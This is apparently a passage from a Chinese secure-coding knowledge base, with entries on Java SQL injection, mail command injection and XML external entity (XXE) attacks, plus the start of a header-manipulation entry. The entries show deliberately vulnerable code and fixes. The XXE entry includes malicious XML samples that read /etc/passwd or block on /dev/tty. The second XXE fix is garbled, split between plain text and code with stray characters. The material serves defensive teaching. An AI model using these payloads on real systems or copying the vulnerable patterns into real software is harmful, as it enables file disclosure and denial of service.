<p>SQL注入攻击允许攻击者欺骗身份，篡改现有数据，引起拒绝问题（如排除交易或更改余额），允许完整披露系统上的所有数据，销毁数据或使其不可用，并成为 数据库服务器管理员。</p>
<h1 id="_3">缓解与预防</h1>
<p>防止SQL注入的主要手段是清理和验证，通常将其实施为参数化查询和存储过程。</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>JDBC库提供了一个用于构建清理不可信数据的SQL命令的API。java.sql.PreparedStatement类正确地转义输入字符串，正确使用时可以防止SQL注入。 此代码示例修改doPrivilegedAction（）方法以使用PreparedStatement而不是java.sql.Statement。 但是，准备好的语句仍然允许SQL注入攻击，通过将unsanitized输入参数用户名插入预准备语句中。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.ResultSet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.Statement</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">Login</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">Connection</span> <span class="nf">getConnection</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">DriverManager</span><span class="o">.</span><span class="na">registerDriver</span><span class="o">(</span><span class="k">new</span>
            <span class="n">com</span><span class="o">.</span><span class="na">microsoft</span><span class="o">.</span><span class="na">sqlserver</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">SQLServerDriver</span><span class="o">());</span>
    <span class="n">String</span> <span class="n">dbConnection</span> <span class="o">=</span>
      <span class="n">PropertyManager</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"db.connection"</span><span class="o">);</span>
    <span class="c1">// Can hold some value like</span>
    <span class="c1">// "jdbc:microsoft:sqlserver://&lt;HOST&gt;:1433,&lt;UID&gt;,&lt;PWD&gt;"</span>
    <span class="k">return</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">dbConnection</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="n">String</span> <span class="nf">hashPassword</span><span class="o">(</span><span class="kt">char</span><span class="o">[]</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Create hash of password</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPrivilegedAction</span><span class="o">(</span>
    <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span>
  <span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
    <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Handle error</span>
    <span class="o">}</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">sqlString</span> <span class="o">=</span> <span class="s">"select * from db_user where username="</span> <span class="o">+</span>
        <span class="n">username</span> <span class="o">+</span> <span class="s">" and password ="</span> <span class="o">+</span> <span class="n">pwd</span><span class="o">;</span>     
      <span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sqlString</span><span class="o">);</span>

      <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
      <span class="k">if</span> <span class="o">(!</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"User name or password incorrect"</span><span class="o">);</span>
      <span class="o">}</span>

      <span class="c1">// Authenticated; proceed</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="k">try</span> <span class="o">{</span>
        <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Forward to handler</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="_7">漏洞代码修复示例</h3>
<p>该修复示例使用参数查询，字符作为参数的占位符。还会验证用户名参数的长度，防止攻击者提交任意长的用户名。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">doPrivilegedAction</span><span class="o">(</span>
  <span class="n">String</span> <span class="n">username</span><span class="o">,</span> <span class="kt">char</span><span class="o">[]</span> <span class="n">password</span>
<span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>
  <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">getConnection</span><span class="o">();</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Handle error</span>
  <span class="o">}</span>
  <span class="k">try</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">pwd</span> <span class="o">=</span> <span class="n">hashPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>

    <span class="c1">// Validate username length</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Handle error</span>
    <span class="o">}</span>

    <span class="n">String</span> <span class="n">sqlString</span> <span class="o">=</span>
      <span class="s">"select * from db_user where username=? and password=?"</span><span class="o">;</span>
    <span class="n">PreparedStatement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">sqlString</span><span class="o">);</span>
    <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">username</span><span class="o">);</span>
    <span class="n">stmt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
    <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">rs</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="n">SecurityException</span><span class="o">(</span><span class="s">"User name or password incorrect"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="c1">// Authenticated; proceed</span>
  <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>使用PreparedStatement类的<code>set*()</code>方法来执行强类型检查。此技术可缓解SQL注入漏洞，因为输入可通过双引号内的自动陷入正确转义。 请注意，即使在将数据插入数据库的查询中也必须使用准备好的语句。</p>
<h1 id="_8">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/89.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/web.html">Web</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/injection.html">Injection</a>
                <a href="../../../tag/cwe-89.html">CWE-89</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1106">邮件命令注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>攻击者利用IMAP/SMTP服务器验证输入过程中的弱点，在服务器上执行命令。</p>
<h1 id="_2">漏洞与风险</h1>
<p>Web邮件服务器处于Internet和IMAP/SMTP邮件服务器之间。当Web邮件服务器接收到用户请求后，Web邮件服务器通过询问后端的邮件服务器以获取用户请求的信息，并将获得的信息返回给用户。在IMAP/SMTP命令注入攻击场景中，攻击者会将邮件服务器上相应的命令嵌入到发送给Web邮件服务器的请求中。如果Web邮件服务器没有合理地对用户的请求进行清洗，那么当请求内容发送到后端邮件服务器后，后端服务器就会执行这些命令。管理人员通常认为后端邮件服务器因为只跟Web邮件服务器通讯而避免了直接与Internet接触，因此就放松了后端邮件服务器上的安全警惕，进而给恶意代码的执行带来了可能。正因如此，邮件命令注入攻击可以说是非常危险的。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>对用户可控制的输入进行验证、过滤，以排除潜在的危险字符。</li>
<li>在将输入用作命令前先对输入进行编码，以保证命令相关的字符不会被当成待使用命令的一部分。</li>
<li>应该对输入进行参数化，或限制只能将输入用在命令的数据部分，以排除误将输入当成部分命令的可能。</li>
</ul>
<h1 id="_5">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-OWASP-A1">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP-A1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0090">XML 外部实体攻击</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#1">漏洞代码修复示例1 : 限制外部实体路径</a></li>
<li><a href="#2">漏洞代码修复示例2 : 禁止使用外部实体</a></li>
</ul>
</li>
<li><a href="#_7">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>XML文档可选地包含文档类型定义（DTD），其中除了其他功能外，还允许定义XML实体。可以通过以URI的形式提供替换字符串来定义实体。 XML解析器可以访问这个URI的内容并将这些内容嵌入到XML文档中以供进一步处理。</p>
<p>通过使用file:// URI提交定义外部实体的XML文件，攻击者可以使处理应用程序读取本地文件的内容。例如，诸如"file:///c:/winnt/win.ini"之类的URI指定（在Windows中）文件C:\Winnt\win.ini，或file:///etc/passwd 指定密码文件在基于Unix的系统中。使用URI与其他方案（如http://），攻击者可强制应用程序向服务器发出传出请求，攻击者无法直接到达服务器，这可用于绕过防火墙限制或隐藏诸如端口扫描等攻击来源。</p>
<p>一旦读取了URI的内容，它就会反馈到正在处理XML的应用程序中。此应用程序可能会回显数据（例如，在错误消息中），从而暴露文件内容。</p>
<h1 id="_2">漏洞与风险</h1>
<p>当包含对外部实体的引用的XML输入由不正确配置的XML解析器处理时，会发生XML外部实体（XXE）攻击。</p>
<p>XML外部实体（XXE）攻击可能引起数据泄露、恶意攻击等诸多问题
 攻击者可能通过操纵实体的URI来引用包含敏感数据如密码和私人用户数据（例如/etc/passwd）的本地文件系统上的文件，从而使用XXE攻击来访问敏感信息。 攻击者可能会发起拒绝服务攻击，例如，通过指定/dev/random或/dev/tty作为输入URI，这些输入URI可能会崩溃或无限制地阻止程序。</p>
<h1 id="_3">缓解与预防</h1>
<p>许多XML解析器和验证器都可以配置为禁用外部实体扩展。</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>这个漏洞代码示例尝试解析文件evil.xml，报告任何错误并退出。但是，由于XML文件中可能包含恶意的实体，导致整个系统受到攻击</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">receiveXMLStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inStream</span><span class="o">,</span>
                                       <span class="n">DefaultHandler</span> <span class="n">defaultHandler</span><span class="o">)</span>
      <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>
    <span class="n">saxParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">inStream</span><span class="o">,</span> <span class="n">defaultHandler</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">receiveXMLStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"evil.xml"</span><span class="o">),</span> 
      <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">mue</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Malformed URL Exception: "</span> <span class="o">+</span> <span class="n">mue</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>如果evil.xml文件包含以下内容，该程序将受到远程XXE攻击：</p>
<p>（1）SAX（简单API for XML）或DOM（文档对象模型）解析器将尝试访问由SYSTEM属性指定的URI，这意味着它将尝试读取本地/dev/tty文件的内容。 在POSIX系统上，读取此文件会导致程序阻塞，直到输入数据提供给机器的控制台。因此，攻击者可以使用此恶意XML文件导致程序挂起。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo SYSTEM "file:/dev/tty"&gt;</span>
<span class="nt">&lt;foo&gt;</span>bar<span class="nt">&lt;/foo&gt;</span>
</pre></div>
</td></tr></table>
<p>（2）SAX（简单API for XML）或DOM（文档对象模型）解析器将尝试访问系统密码文件（/etc/passwd），导致数据泄露</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">&lt;</span>?xml version="1.0" encoiding="utf-8"&gt;
<span class="cp">&lt;!DOCTYPE hack [</span>
<span class="cp">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span>
   %name; 
]&gt;
</pre></div>
</td></tr></table>
<h3 id="1">漏洞代码修复示例1 : 限制外部实体路径</h3>
<p>该漏洞代码修复示例定义了一个实现了org.xml.sax.EntityResolver接口的CustomResolver类。该接口使SAX应用程序能够自定义外部实体的处理。 自定义处理程序为外部实体使用一个自定义的安全判定函数，如果访问的实体路径是安全的则可以继续解析。当输入无法解析为任何指定的安全实体源路径时，resolveEntity()方法将返回一个空的InputSource。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.EntityResolver</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">CustomResolver</span> <span class="kd">implements</span> <span class="n">EntityResolver</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">InputSource</span> <span class="nf">resolveEntity</span><span class="o">(</span><span class="n">String</span> <span class="n">publicId</span><span class="o">,</span> <span class="n">String</span> <span class="n">systemId</span><span class="o">)</span>
      <span class="kd">throws</span> <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>

    <span class="c1">// Check for known good entities</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">isSafe</span><span class="o">(</span><span class="n">publicId</span><span class="o">,</span> <span class="n">systemId</span><span class="o">))</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Resolving entity: "</span> <span class="o">+</span> <span class="n">publicId</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="n">systemId</span><span class="o">);</span>
      <span class="k">return</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">entityPath</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
      <span class="c1">// Disallow unknown entities by returning a blank path</span>
      <span class="k">return</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">();</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>setEntityResolver()方法用相应的SAX驱动程序注册实例。解析恶意输入时，自定义解析器返回的空InputSource会导致引发java.net.MalformedURLException。 请注意，您必须创建一个XMLReader对象来设置自定义实体解析器。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.xml.sax.InputSource</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.XMLReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="o">;</span>

<span class="kd">class</span> <span class="nc">XXE</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">receiveXMLStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inStream</span><span class="o">,</span> 
      <span class="n">DefaultHandler</span> <span class="n">defaultHandler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span> 
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">SAXParserFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">SAXParserFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>

    <span class="c1">// Create an XML reader to set the entity resolver.</span>
    <span class="n">XMLReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">saxParser</span><span class="o">.</span><span class="na">getXMLReader</span><span class="o">();</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">setEntityResolver</span><span class="o">(</span><span class="k">new</span> <span class="n">CustomResolver</span><span class="o">());</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">setContentHandler</span><span class="o">(</span><span class="n">defaultHandler</span><span class="o">);</span>

    <span class="n">InputSource</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">inStream</span><span class="o">);</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">receiveXMLStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"evil.xml"</span><span class="o">),</span> 
      <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">mue</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Malformed URL Exception: "</span> <span class="o">+</span> <span class="n">mue</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="2">漏洞代码修复示例2 : 禁止使用外部实体</h3>
<p>class XXE {
  private static void receiveXMLStream(InputStream inStream, 
      DefaultHandler defaultHandler) throws ParserConfigurationException, 
      SAXException, IOException {
    SAXParserFactory factory = SAXParserFactory.newInstance();
    SAXParser saxParser = factory.newSAXParser();</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">//</span> <span class="nt">Create</span> <span class="nt">an</span> <span class="nt">XML</span> <span class="nt">reader</span> <span class="nt">to</span> <span class="nt">set</span> <span class="nt">the</span> <span class="nt">parameters</span><span class="o">.</span>
<span class="nt">XMLReader</span> <span class="nt">reader</span> <span class="o">=</span> <span class="nt">saxParser</span><span class="p">.</span><span class="nc">getXMLReader</span><span class="o">();</span>

<span class="o">//</span> <span class="nt">Disable</span> <span class="nt">external</span> <span class="nt">entity</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">setFeature</span><span class="o">(</span><span class="nt">http</span><span class="o">://</span><span class="nt">xml</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">sax</span><span class="o">/</span><span class="nt">features</span><span class="o">/</span><span class="nt">external-general-entities</span><span class="err">"</span><span class="o">,</span> <span class="nt">false</span><span class="o">);</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">setContentHandler</span><span class="o">(</span><span class="nt">defaultHandler</span><span class="o">);</span>

<span class="nt">InputSource</span> <span class="nt">is</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">InputSource</span><span class="o">(</span><span class="nt">inStream</span><span class="o">);</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">parse</span><span class="o">(</span><span class="nt">is</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>}</p>
<p>public static void main(String[] args) throws ParserConfigurationException,
      SAXException, IOException {
    try {
      receiveXMLStream(new FileInputStream("evil.xml"), 
      new DefaultHandler());
    } catch (java.net.MalformedURLException mue) {
      System.err.println("Malformed URL Exception: " + mue);
    }
  }
}
```</p>
<h1 id="_7">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/611.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS17-J.+Prevent+XML+External+Entity+Attacks.html <a class="footnote-backref" href="#fnref-CERT" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-611.html">CWE-611</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1088">头部操纵</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_7">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
